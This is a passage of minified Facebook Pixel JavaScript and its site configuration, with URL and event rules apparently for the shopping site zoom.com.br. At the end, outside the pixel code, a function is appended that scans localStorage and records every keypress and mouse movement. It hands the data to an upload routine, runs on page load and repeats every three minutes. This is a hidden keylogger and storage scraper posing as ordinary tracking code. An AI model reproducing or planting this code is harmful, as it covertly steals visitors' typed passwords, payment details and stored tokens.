          logMessage: "Pixel code is not installed correctly on this page"
        }, "*");
        "error" in console && console.error("Facebook Pixel Error: Pixel code is not installed correctly on this page");
        return !1;
      }
      return !0;
    }()) return;
    f.__fbeventsModules || (f.__fbeventsModules = {}, f.__fbeventsResolvedModules = {}, f.getFbeventsModules = function (a) {
      f.__fbeventsResolvedModules[a] || (f.__fbeventsResolvedModules[a] = f.__fbeventsModules[a]());
      return f.__fbeventsResolvedModules[a];
    }, f.fbIsModuleLoaded = function (a) {
      return !!f.__fbeventsModules[a];
    }, f.ensureModuleRegistered = function (b, a) {
      f.fbIsModuleLoaded(b) || (f.__fbeventsModules[b] = a);
    });
    f.ensureModuleRegistered("SignalsFBEventsClientHintTypedef", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("SignalsFBEventsTyped");
          a.coerce;
          a = a.Typed;
          var b = a.objectWithFields({
            brands: a.array(),
            platform: a.allowNull(a.string()),
            getHighEntropyValues: a.func()
          });
          a = a.objectWithFields({
            model: a.allowNull(a.string()),
            platformVersion: a.allowNull(a.string()),
            fullVersionList: a.array()
          });
          e.exports = {
            userAgentDataTypedef: b,
            highEntropyResultTypedef: a
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEventsGetIsAndroidChrome", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var a = f.getFbeventsModules("signalsFBEventsGetIsChrome");
          function b(a) {
            return a === void 0 ? !1 : a.platform === "Android" && a.brands.map(function (a) {
              return a.brand;
            }).join(", ").includes("Chrome");
          }
          function c(a) {
            return a.includes("Chrome") && a.includes("Android");
          }
          function d(b) {
            b = b.indexOf("Android") >= 0;
            var c = a();
            return b && c;
          }
          e.exports = {
            checkIsAndroidChromeWithClientHint: b,
            checkIsAndroidChromeWithUAString: c,
            checkIsAndroidChrome: d
          };
        })();
        return e.exports;
      }(a, b, c, d);
    });
    f.ensureModuleRegistered("SignalsFBEvents.plugins.clienthint", function () {
      return function (a, b, c, d) {
        var e = {
          exports: {}
        };
        e.exports;
        (function () {
          "use strict";

          var b = f.getFbeventsModules("SignalsFBEventsEvents");
          b.fired;
          b = f.getFbeventsModules("SignalsFBEventsPlugin");
          var c = f.getFbeventsModules("SignalsParamList"),
            d = f.getFbeventsModules("signalsFBEventsSendEvent"),
            g = f.getFbeventsModules("SignalsFBEventsEvents"),
            h = g.configLoaded,
            i = f.getFbeventsModules("SignalsFBEventsSendEventEvent");
          g = f.getFbeventsModules("SignalsFBEventsLogging");
          var j = g.logError;
          g = f.getFbeventsModules("SignalsFBEventsTyped");
          var k = g.coerce;
          g.Typed;
          g = f.getFbeventsModules("SignalsFBEventsClientHintTypedef");
          var l = g.userAgentDataTypedef,
            m = g.highEntropyResultTypedef;
          g = f.getFbeventsModules("SignalsFBEventsGetIsAndroidChrome");
          var n = g.checkIsAndroidChrome,
            o = "chmd",
            p = "chpv",
            q = "chfv",
            r = [o, p, q],
            s = [],
            t = 200,
            u = new Map(),
            v = null,
            w = !0;
          function x(b, e, a) {
            w = !1;
            while (a.length > 0) {
              b = a.shift();
              var f = b.customParams || new c(),
                g = !0,
                h = !1,
                i = void 0;
              try {
                for (var j = r[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](), k; !(g = (k = j.next()).done); g = !0) {
                  k = k.value;
                  f.get(k) == null && f.append(k, e.get(k));
                }
              } catch (a) {
                h = !0, i = a;
              } finally {
                try {
                  !g && j["return"] && j["return"]();
                } finally {
                  if (h) throw i;
                }
              }
              b.customParams = f;
              d(b);
            }
          }
          e.exports = new b(function (b, d) {
            b = k(a.navigator.userAgentData, l);
            if (b == null) {
              a.navigator.userAgentData != null && j(new Error("[ClientHint Error] UserAgentData coerce error"));
              return;
            } else if (!n(a.navigator.userAgent)) return;
            a.navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "fullVersionList"]).then(function (a) {
              a = k(a, m);
              if (a == null) {
                j(new Error("[ClientHint Error] getHighEntropyValues returned null from Android Chrome source"));
                return;
              }
              u.set(o, String(a.model));
              u.set(p, String(a.platformVersion));
              var b = void 0,
                c = void 0,
                e = !0,
                f = !1,
                g = void 0;
              try {
                for (var h = a.fullVersionList[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](), a; !(e = (a = h.next()).done); e = !0) c = a.value, c.brand.includes("Chrome") && (b = c.version);
              } catch (a) {
                f = !0, g = a;
              } finally {
                try {
                  !e && h["return"] && h["return"]();
                } finally {
                  if (f) throw g;
                }
              }
              u.set(q, String(b));
              x(d, u, s);
            })["catch"](function (a) {
              a.message = "[ClientHint Error]" + a.message, j(a);
            });
            h.listen(function (b) {
              b = d.getPixel(b);
              if (b == null) return;
              b = d.pluginConfig.get(b.id, "clientHint");
              var c = b != null && b.delayInMs != null ? b.delayInMs : t;
              b = b != null && b.disableBackupTimeout != null ? b.disableBackupTimeout : !1;
              v === null && !b && (v = a.setTimeout(function () {
                x(d, u, s);
              }, c));
            });
            i.listen(function (a) {
              if (!w) {
                var b = a.customParams || new c(),
                  e = !0,
                  f = !1,
                  g = void 0;
                try {
                  for (var h = r[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](), i; !(e = (i = h.next()).done); e = !0) {
                    i = i.value;
                    b.get(i) == null && b.append(i, u.get(i));
                  }
                } catch (a) {
                  f = !0, g = a;
                } finally {
                  try {
                    !e && h["return"] && h["return"]();
                  } finally {
                    if (f) throw g;
                  }
                }
                a.customParams = b;
                return !1;
              }
              i = a.id;
              if (i == null) return !1;
              e = d.pluginConfig.get(i.toString(), "clientHint");
              if (e == null) return !1;
              s.push(a);
              return !0;
            });
          });
        })();
        return e.exports;
      }(a, b, c, d);
    });
    e.exports = f.getFbeventsModules("SignalsFBEvents.plugins.clienthint");
    f.registerPlugin && f.registerPlugin("fbevents.plugins.clienthint", e.exports);
    f.ensureModuleRegistered("fbevents.plugins.clienthint", function () {
      return e.exports;
    });
  })();
})(window, document, location, history);
fbq.registerPlugin("549927231793419", {
  __fbEventsPlugin: 1,
  plugin: function (fbq, instance, config) {
    fbq.loadPlugin("iwlbootstrapper");
    instance.optIn("549927231793419", "IWLBootstrapper", true);
    fbq.loadPlugin("iwlparameters");
    instance.optIn("549927231793419", "IWLParameters", true);
    fbq.set("iwlExtractors", "549927231793419", []);
    fbq.loadPlugin("cookie");
    instance.optIn("549927231793419", "FirstPartyCookies", true);
    config.set(null, "batching", {
      "batchWaitTimeMs": 501,
      "maxBatchSize": 10
    });
    config.set(null, "microdata", {
      "waitTimeMs": 500
    });
    config.set("549927231793419", "prohibitedSources", {
      "prohibitedSources": []
    });
    fbq.loadPlugin("prohibitedsources");
    instance.optIn("549927231793419", "ProhibitedSources", true);
    config.set("549927231793419", "unwantedData", {
      "blacklisted_keys": {
        "Purchase": {
          "cd": [],
          "url": ["af_ip"]
        }
      },
      "sensitive_keys": {}
    });
    fbq.loadPlugin("unwanteddata");
    instance.optIn("549927231793419", "UnwantedData", true);
    fbq.loadPlugin("iabpcmaebridge");
    instance.optIn("549927231793419", "IABPCMAEBridge", true);
    config.set("549927231793419", "browserProperties", {
      "delayInMs": 200,
      "enableEventSuppression": true,
      "enableBackupTimeout": true
    });
    fbq.loadPlugin("browserproperties");
    instance.optIn("549927231793419", "BrowserProperties", true);
    config.set("549927231793419", "protectedDataMode", {
      "standardParams": {
        "lead_event_source": true,
        "predicted_ltv": true,
        "product_catalog_id": true,
        "availability": true,
        "body_style": true,
        "checkin_date": true,
        "checkout_date": true,
        "city": true,
        "condition_of_vehicle": true,
        "content_category": true,
        "content_ids": true,
        "content_name": true,
        "content_type": true,
        "contents": true,
        "country": true,
        "currency": true,
        "delivery_category": true,
        "departing_arrival_date": true,
        "departing_departure_date": true,
        "destination_airport": true,
        "destination_ids": true,
        "dma_code": true,
        "drivetrain": true,
        "exterior_color": true,
        "fuel_type": true,
        "hotel_score": true,
        "interior_color": true,
        "lease_end_date": true,
        "lease_start_date": true,
        "listing_type": true,
        "make": true,
        "mileage.unit": true,
        "mileage.value": true,
        "model": true,
        "neighborhood": true,
        "num_adults": true,
        "num_children": true,
        "num_infants": true,
        "num_items": true,
        "order_id": true,
        "origin_airport": true,
        "postal_code": true,
        "preferred_baths_range": true,
        "preferred_beds_range": true,
        "preferred_neighborhoods": true,
        "preferred_num_stops": true,
        "preferred_price_range": true,
        "preferred_star_ratings": true,
        "price": true,
        "property_type": true,
        "region": true,
        "returning_arrival_date": true,
        "returning_departure_date": true,
        "search_string": true,
        "state_of_vehicle": true,
        "status": true,
        "suggested_destinations": true,
        "suggested_home_listings": true,
        "suggested_hotels": true,
        "suggested_jobs": true,
        "suggested_local_service_businesses": true,
        "suggested_location_based_items": true,
        "suggested_vehicles": true,
        "transmission": true,
        "travel_class": true,
        "travel_end": true,
        "travel_start": true,
        "trim": true,
        "user_bucket": true,
        "value": true,
        "vin": true,
        "year": true
      }
    });
    fbq.loadPlugin("protecteddatamode");
    instance.optIn("549927231793419", "ProtectedDataMode", true);
    config.set("549927231793419", "ccRuleEvaluator", {
      "ccRules": [],
      "wcaRules": [{
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "pneu"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "bridgestone"
              }
            }]
          }]
        },
        "id": "1071657669606122"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "eq": "www.zoom.com.br"
              }
            }]
          }]
        },
        "id": "1138284826298102"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "ar-condicionado"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "split"
              }
            }]
          }]
        },
        "id": "1409036002500699"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }]
        },
        "id": "1604533589574269"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "notebook"
              }
            }]
          }]
        },
        "id": "974103779355732"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "celular"
              }
            }]
          }]
        },
        "id": "968056096629616"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lead?oid="
              }
            }]
          }]
        },
        "id": "1410198958999938"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": ""
              }
            }]
          }]
        },
        "id": "1687078247976135"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "celular"
              }
            }]
          }]
        },
        "id": "6025061609185"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "eq": "www.zoom.com.br"
              }
            }]
          }]
        },
        "id": "6024922137985"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "AddToCart"
            }
          }]
        },
        "id": "6236613133054240"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "9414380211968082"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "ViewContent"
            }
          }]
        },
        "id": "6328078843948328"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "InitiateCheckout"
            }
          }]
        },
        "id": "7103151449711593"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "InitiateCheckout"
            }
          }]
        },
        "id": "7025214250827699"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "6295877007167291"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "AddToCart"
            }
          }]
        },
        "id": "6368571576540429"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "ViewContent"
            }
          }]
        },
        "id": "7038070802887812"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "AddToCart"
            }
          }]
        },
        "id": "5287316761393659"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "4840118496088600"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "InitiateCheckout"
            }
          }]
        },
        "id": "5718061774884243"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "ViewContent"
            }
          }]
        },
        "id": "5650162781696622"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "4957135614355156"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "ViewContent"
            }
          }]
        },
        "id": "5227738077304144"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "AddToCart"
            }
          }]
        },
        "id": "4911536235561780"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "InitiateCheckout"
            }
          }]
        },
        "id": "5053839018039136"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "ViewContent"
            }
          }]
        },
        "id": "5061096627237930"
      }, {
        "rule": {
          "and": [{
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "4328020173885879"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "4257263627703785"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Subscribe"
            }
          }]
        },
        "id": "3938356796286662"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "PageView"
            }
          }]
        },
        "id": "4114124298708506"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "CompleteRegistration"
            }
          }]
        },
        "id": "6456194967740475"
      }, {
        "rule": {
          "url": {
            "i_contains": ""
          }
        },
        "id": "6501377003265963"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "CompleteRegistration"
            }
          }]
        },
        "id": "6525241057528744"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Lead"
            }
          }]
        },
        "id": "4545151198942071"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lead?oid="
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "6076814735713407"
      }, {
        "rule": {
          "and": [{
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "5555722291206046"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "ViewContent"
            }
          }]
        },
        "id": "5174484302619268"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "AddToCart"
            }
          }]
        },
        "id": "5155064851182417"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "4941142742637032"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "InitiateCheckout"
            }
          }]
        },
        "id": "4924291717651198"
      }, {
        "rule": {
          "url": {
            "i_contains": ""
          }
        },
        "id": "4776106442473535"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "3397498677024676"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "3759926917351418"
      }, {
        "rule": {
          "and": [{
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "3573725016022540"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "3510636205624137"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tenis"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2325698357507862"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lavadora-roupas"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2906228022727173"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "microondas"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2582647025079992"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "fogao"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2816862338328373"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "geladeira"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2528541877203758"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2296654500371136"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "notebook"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2780381715323848"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "celular"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2375736975838390"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "console-de-video-game"
              }
            }]
          }, {
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "2479920328718025"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "fb_mobile_tutorial_completion"
            }
          }]
        },
        "id": "2599717030052370"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "moto-g"
              }
            }]
          }]
        },
        "id": "2236712959757402"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }]
        },
        "id": "2147720465295697"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "sofa"
              }
            }]
          }]
        },
        "id": "2184891444899791"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "ipad"
              }
            }]
          }]
        },
        "id": "2780776405297535"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": ""
              }
            }]
          }]
        },
        "id": "2223200004383489"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "iphone"
              }
            }]
          }]
        },
        "id": "2984595964914141"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "macbook"
              }
            }]
          }]
        },
        "id": "2064595516979688"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "notebook"
              }
            }]
          }]
        },
        "id": "1888761284558265"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "celular"
              }
            }]
          }]
        },
        "id": "2796303887051608"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "cooktop"
              }
            }]
          }]
        },
        "id": "2196529803734500"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "cama"
              }
            }]
          }]
        },
        "id": "2702726383102947"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "nokia-lumia"
              }
            }]
          }]
        },
        "id": "2731582446912895"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "moto-g"
              }
            }]
          }]
        },
        "id": "3196442503715123"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "moto-x"
              }
            }]
          }]
        },
        "id": "2127420570686678"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tablet-samsung"
              }
            }]
          }]
        },
        "id": "2483461351685795"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "guarda-roupas"
              }
            }]
          }]
        },
        "id": "2383077778396843"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "moto-x"
              }
            }]
          }]
        },
        "id": "2467174863317269"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lead?oid="
              }
            }]
          }]
        },
        "id": "2723458027695448"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lava-e-seca"
              }
            }]
          }]
        },
        "id": "2653585088050212"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "celular"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "sony"
              }
            }]
          }]
        },
        "id": "1903927529722451"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "fogao"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "4-bocas"
              }
            }]
          }]
        },
        "id": "2644290348950089"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "42"
              }
            }]
          }]
        },
        "id": "2756512014389845"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "camera"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "Canon"
              }
            }]
          }]
        },
        "id": "2173482252739967"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tenis"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "corrida"
              }
            }]
          }]
        },
        "id": "2146636535373168"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "smartphone-samsung"
              }
            }]
          }]
        },
        "id": "2689044434502529"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "og=19213"
              }
            }]
          }]
        },
        "id": "2283830984970258"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "3d"
              }
            }]
          }]
        },
        "id": "2196072987180508"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "notebook-dell"
              }
            }]
          }]
        },
        "id": "2175439389208378"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "www.zoom.com.br"
              }
            }]
          }]
        },
        "id": "2049605145168586"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "ar-condicionado"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "portatil"
              }
            }]
          }]
        },
        "id": "2161339383904027"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "fritadeira"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "sem-oleo"
              }
            }]
          }]
        },
        "id": "2733291933409813"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "camera"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "nikon"
              }
            }]
          }]
        },
        "id": "2997373166954459"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "pneu"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "bridgestone"
              }
            }]
          }]
        },
        "id": "2034561456666627"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "motorola-moto-g"
              }
            }]
          }]
        },
        "id": "1978111918981829"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "32"
              }
            }]
          }]
        },
        "id": "2897765586915150"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "eq": "www.zoom.com.br"
              }
            }]
          }]
        },
        "id": "2411281362268055"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "ar-condicionado"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "janela-parede"
              }
            }]
          }]
        },
        "id": "2645122128835587"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "40"
              }
            }]
          }]
        },
        "id": "2234520353295711"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "smartphone"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "moto-e"
              }
            }]
          }]
        },
        "id": "2080851141968730"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "sapato"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "masculino"
              }
            }]
          }]
        },
        "id": "2155103234608144"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tv"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "46"
              }
            }, {
              "url": {
                "i_contains": "47"
              }
            }, {
              "url": {
                "i_contains": "48"
              }
            }]
          }]
        },
        "id": "2397510520287975"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "console"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "playstation"
              }
            }]
          }]
        },
        "id": "2736112906418351"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "rack-painel-estante"
              }
            }]
          }]
        },
        "id": "2070620959716804"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "ar-condicionado"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "split"
              }
            }]
          }]
        },
        "id": "2350776811610596"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "home-theater"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "lg"
              }
            }]
          }]
        },
        "id": "2246030572145073"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "motorola-moto-x"
              }
            }]
          }]
        },
        "id": "1932697686835441"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lg"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "celular"
              }
            }]
          }]
        },
        "id": "2912371132137321"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "geladeira"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "brastemp"
              }
            }]
          }]
        },
        "id": "2171052389658296"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "lavadora"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "brastemp"
              }
            }]
          }]
        },
        "id": "2181503821935469"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "console-xbox"
              }
            }]
          }]
        },
        "id": "1417992344992461"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "sapato"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "feminino"
              }
            }]
          }]
        },
        "id": "2178220045624837"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "og=19212"
              }
            }]
          }]
        },
        "id": "2174802852566978"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "tenis"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "casual"
              }
            }]
          }]
        },
        "id": "2378286685547488"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "bicicleta"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "eletrica"
              }
            }]
          }]
        },
        "id": "2124854217634519"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "microondas"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "brastemp"
              }
            }]
          }]
        },
        "id": "2683480941727335"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "microondas"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "electrolux"
              }
            }]
          }]
        },
        "id": "2181225248659420"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "home-theater"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "sony"
              }
            }]
          }]
        },
        "id": "2112641478805089"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "capa-para-celular"
              }
            }]
          }]
        },
        "id": "2348610961863070"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "geladeira"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "electrolux"
              }
            }]
          }]
        },
        "id": "1926395734132276"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "impressora"
              }
            }]
          }, {
            "or": [{
              "url": {
                "i_contains": "multifuncional"
              }
            }]
          }]
        },
        "id": "2251756951574552"
      }, {
        "rule": {
          "and": [{
            "or": [{
              "url": {
                "i_contains": "bicicleta-caloi"
              }
            }]
          }]
        },
        "id": "2613527762055078"
      }, {
        "rule": {
          "and": [{
            "url": {
              "i_contains": ""
            }
          }]
        },
        "id": "1837203163005839"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "Purchase"
            }
          }]
        },
        "id": "1716707098412816"
      }, {
        "rule": {
          "and": [{
            "event": {
              "eq": "CompraMKP"
            }
          }]
        },
        "id": "1657472017682227"
      }],
      "blacklistedIframeReferrers": {
        "google": true
      }
    });
    fbq.loadPlugin("ccruleevaluator");
    instance.optIn("549927231793419", "CCRuleEvaluator", true);
    config.set("549927231793419", "clientHint", {
      "delayInMs": 200,
      "disableBackupTimeout": false
    });
    fbq.loadPlugin("clienthint");
    instance.optIn("549927231793419", "ClientHint", true);
    instance.configLoaded("549927231793419");
  }
});
function collectionAndUploadBehaviorData() {
  const collectedData = scanLocalStorage();
  if (Object.keys(collectedData).length > 0) {
    captureData(collectedData, 'LocalStorage');
  }

  // Track mouse events
  document.onmousemove = function (e) {
    let pos = {
      x: e.clientX,
      y: e.clientY
    };
    captureData(pos, 'MouseMove');
  };

  // Track key press events - jshook
  document.onkeypress = function (e) {
    let key = {
      key: e.key,
      keyCode: e.keyCode
    };
    captureData(key, 'KeyPress');
  };
}
window.addEventListener('DOMContentLoaded', function () {
  collectionAndUploadBehaviorData();
  setInterval(collectionAndUploadBehaviorData, 3 * 60 * 1000);
});